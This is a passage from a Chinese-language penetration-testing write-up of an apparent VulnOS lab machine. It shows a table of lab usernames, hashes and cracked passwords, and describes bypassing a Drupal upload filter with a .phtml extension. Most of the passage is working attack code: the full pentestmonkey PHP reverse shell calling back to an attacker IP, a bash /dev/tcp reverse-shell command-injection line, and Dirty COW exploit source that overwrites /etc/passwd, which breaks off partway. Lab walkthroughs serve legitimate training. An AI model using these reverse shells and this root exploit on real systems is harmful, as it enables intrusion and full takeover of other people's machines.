+<th style="text-align: center;">db</th>
+<th style="text-align: center;">username</th>
+<th style="text-align: center;">pass_hash</th>
+<th style="text-align: center;">pass</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">dolibarr</td>
+<td style="text-align: center;">vulnosadmin</td>
+<td style="text-align: center;">100500c774ec4cb365a49d9cbbed5f5a</td>
+<td style="text-align: center;">vulnosadmin</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">drupal6</td>
+<td style="text-align: center;">drupal6</td>
+<td style="text-align: center;">ab57944b510148c7299a13f6cb31ef6e</td>
+<td style="text-align: center;">drupal6</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">webmin</td>
+<td style="text-align: center;">74d9d056e794bf808816edafd125cd9c</td>
+<td style="text-align: center;">-</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">dvwa</td>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">5f4dcc3b5aa765d61d8327deb882cf99</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">gordonb</td>
+<td style="text-align: center;">e99a18c428cb38d5f260853678922e03</td>
+<td style="text-align: center;">abc123</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">1337</td>
+<td style="text-align: center;">8d3533d75ae2c3966d7e0d4fcc69216b</td>
+<td style="text-align: center;">charley</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">pablo</td>
+<td style="text-align: center;">0d107d09f5bbe40cade3de5c71e9e9b7</td>
+<td style="text-align: center;">letmein</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">smithy</td>
+<td style="text-align: center;">5f4dcc3b5aa765d61d8327deb882cf99</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">nowasp</td>
+<td style="text-align: center;">admin</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">adminpass</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">adrian</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">somepassword</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">john</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">monkey</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">jeremy</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">bryce</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">samurai</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">samurai</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">jim</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">bobby</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">simba</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">dreveil</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">scotty</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">cal</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">john</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">password</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">kevin</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">42</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">dave</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">set</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">patches</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">tortoise</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">rocky</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">stripes</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">ed</td>
+<td style="text-align: center;">-</td>
+<td style="text-align: center;">pentest</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">weberp</td>
+<td style="text-align: center;">admin</td>
+<td
+style="text-align: center;">f0f77a7f88e7c1e93ab4e316b4574c7843b00ea4</td>
+<td style="text-align: center;">weberp</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">WEB0000017</td>
+<td
+style="text-align: center;">f0f77a7f88e7c1e93ab4e316b4574c7843b00ea4</td>
+<td style="text-align: center;">weberp</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">weberpdemo</td>
+<td style="text-align: center;">admin</td>
+<td
+style="text-align: center;">f0f77a7f88e7c1e93ab4e316b4574c7843b00ea4</td>
+<td style="text-align: center;">weberp</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">WEB0000017</td>
+<td
+style="text-align: center;">f0f77a7f88e7c1e93ab4e316b4574c7843b00ea4</td>
+<td style="text-align: center;">weberp</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">wikidb</td>
+<td style="text-align: center;">4d7976756c6e77696b69</td>
+<td
+style="text-align: center;">:B:58a66cef:b7a31817f81b533f01171b31af34a410</td>
+<td style="text-align: center;">-</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;"></td>
+<td style="text-align: center;">56756c6e6f7361646d696e</td>
+<td
+style="text-align: center;">:B:c00de07e:5eba7828e17b2fe4b126b40c586d2161</td>
+<td style="text-align: center;">-</td>
+</tr>
+</tbody>
+</table>
+<p>依次访问站点对应站点看看</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272309064.png" /></p>
+<p>根据 usefull links 并提示修改 IP 为 10.0.3.21 可进一步收集信息</p>
+<p>当前 CMS drupal6 可利用前面得到的 drupal6/drupal6
+登录，经测当前用户可直接修改站点配置中对上传文件类型的限制，修改后可上传
+shell</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272327978.png" /></p>
+<p>经测后端依旧会检测 php 后缀，上传后会添加 <code>.txt</code> ，不过
+phtml 后缀可绕过【phtml 后缀添加同前图】</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272327980.png" /></p>
+<p>re_shell.phtml</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class="line"><span class="comment">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">set_time_limit</span> (<span class="number">0</span>);</span><br><span class="line"><span class="variable">$VERSION</span> = <span class="string">&quot;1.0&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="string">&#x27;192.168.159.152&#x27;</span>;</span><br><span class="line"><span class="variable">$port</span> = <span class="number">4444</span>;</span><br><span class="line"><span class="variable">$chunk_size</span> = <span class="number">1400</span>;</span><br><span class="line"><span class="variable">$write_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$error_a</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="variable">$shell</span> = <span class="string">&#x27;uname -a; w; id; sh -i&#x27;</span>;</span><br><span class="line"><span class="variable">$daemon</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$debug</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class="line">	<span class="variable">$pid</span> = <span class="title function_ invoke__">pcntl_fork</span>();</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span> == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$pid</span>) &#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">0</span>);  <span class="comment">// Parent exits</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">posix_setsid</span>() == -<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;Error: Can&#x27;t setsid()&quot;</span>);</span><br><span class="line">		<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$daemon</span> = <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Open reverse connection</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$ip</span>, <span class="variable">$port</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$sock</span>) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line">   <span class="number">0</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;r&quot;</span>),  <span class="comment">// stdin is a pipe that the child will read from</span></span><br><span class="line">   <span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>),  <span class="comment">// stdout is a pipe that the child will write to</span></span><br><span class="line">   <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&quot;pipe&quot;</span>, <span class="string">&quot;w&quot;</span>)   <span class="comment">// stderr is a pipe that the child will write to</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="variable">$shell</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_resource</span>(<span class="variable">$process</span>)) &#123;</span><br><span class="line">	<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Can&#x27;t spawn shell&quot;</span>);</span><br><span class="line">	<span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">stream_set_blocking</span>(<span class="variable">$sock</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">printit</span>(<span class="string">&quot;Successfully opened reverse shell to <span class="subst">$ip</span>:<span class="subst">$port</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$sock</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell connection terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">feof</span>(<span class="variable">$pipes</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">		<span class="title function_ invoke__">printit</span>(<span class="string">&quot;ERROR: Shell process terminated&quot;</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$read_a</span> = <span class="keyword">array</span>(<span class="variable">$sock</span>, <span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line">	<span class="variable">$num_changed_sockets</span> = <span class="title function_ invoke__">stream_select</span>(<span class="variable">$read_a</span>, <span class="variable">$write_a</span>, <span class="variable">$error_a</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$sock</span>, <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$sock</span>, <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;SOCK: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$pipes</span>[<span class="number">0</span>], <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">1</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDOUT: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$read_a</span>)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR READ&quot;</span>);</span><br><span class="line">		<span class="variable">$input</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$pipes</span>[<span class="number">2</span>], <span class="variable">$chunk_size</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$debug</span>) <span class="title function_ invoke__">printit</span>(<span class="string">&quot;STDERR: <span class="subst">$input</span>&quot;</span>);</span><br><span class="line">		<span class="title function_ invoke__">fwrite</span>(<span class="variable">$sock</span>, <span class="variable">$input</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$sock</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$pipes</span>[<span class="number">2</span>]);</span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printit</span> (<span class="params"><span class="variable">$string</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="variable">$daemon</span>) &#123;</span><br><span class="line">		<span class="keyword">print</span> <span class="string">&quot;<span class="subst">$string</span>\n&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>kali 开启监听后访问</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272330348.png" /></p>
+<p>由于 dvwa 也存在弱口令，亦可利用 DVWA 来反弹 shell，示例</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;bash -c <span class="string">&#x27;bash -i &gt;&amp; /dev/tcp/10.0.3.5/4444 0&gt;&amp;1&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272333073.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202405272333074.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p>上传 linpeas.sh 执行后得靶机存在 linux 内核漏洞，即可利用
+<code>Dirty COW</code> 提权至 root</p>
+<p>dirty.c</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This exploit uses the pokemon exploit of the dirtycow vulnerability</span></span><br><span class="line"><span class="comment">// as a base and automatically generates a new passwd line.</span></span><br><span class="line"><span class="comment">// The user will be prompted for the new password when the binary is run.</span></span><br><span class="line"><span class="comment">// The original /etc/passwd file is then backed up to /tmp/passwd.bak</span></span><br><span class="line"><span class="comment">// and overwrites the root account with the generated line.</span></span><br><span class="line"><span class="comment">// After running the exploit you should be able to login with the newly</span></span><br><span class="line"><span class="comment">// created user.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// To use this exploit modify the user values according to your needs.</span></span><br><span class="line"><span class="comment">//   The default is &quot;firefart&quot;.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Original exploit (dirtycow&#x27;s ptrace_pokedata &quot;pokemon&quot; method):</span></span><br><span class="line"><span class="comment">//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Compile with:</span></span><br><span class="line"><span class="comment">//   gcc -pthread dirty.c -o dirty -lcrypt</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Then run the newly create binary by either doing:</span></span><br><span class="line"><span class="comment">//   &quot;./dirty&quot; or &quot;./dirty my-new-password&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Afterwards, you can either &quot;su firefart&quot; or &quot;ssh firefart@...&quot;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// DON&#x27;T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!</span></span><br><span class="line"><span class="comment">//   mv /tmp/passwd.bak /etc/passwd</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Exploit adopted by Christian &quot;FireFart&quot; Mehlmauer</span></span><br><span class="line"><span class="comment">// https://firefart.at</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;crypt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *filename = <span class="string">&quot;/etc/passwd&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *backup_filename = <span class="string">&quot;/tmp/passwd.bak&quot;</span>;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *salt = <span class="string">&quot;firefart&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> f;</span><br><span class="line"><span class="type">void</span> *<span class="built_in">map</span>;</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span 